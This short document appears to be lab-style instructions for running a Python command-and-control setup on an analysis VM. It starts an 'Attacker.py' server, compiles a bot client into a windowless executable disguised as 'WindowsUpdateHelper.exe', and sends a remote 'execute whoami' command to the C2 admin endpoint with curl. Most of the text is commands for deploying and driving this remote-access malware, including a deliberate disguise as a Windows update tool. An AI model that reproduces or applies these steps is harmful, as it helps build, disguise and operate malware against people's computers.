- On your Analysis VM, run the server: python Attacker.py.

- On your Analysis VM, compile the Bot.py into an EXE:
```bash
    pip install pyinstaller
    pyinstaller --onefile --windowed --name "WindowsUpdateHelper.exe" bot_client.py
```

- From your Analysis VM, send a command using curl or a browser

```bash
#'whoami' command
curl -X POST http://192.168.56.101:5000/admin/command -H "Content-Type: application/json" -d "{\"command\": \"execute\", \"data\": \"whoami\"}"
```
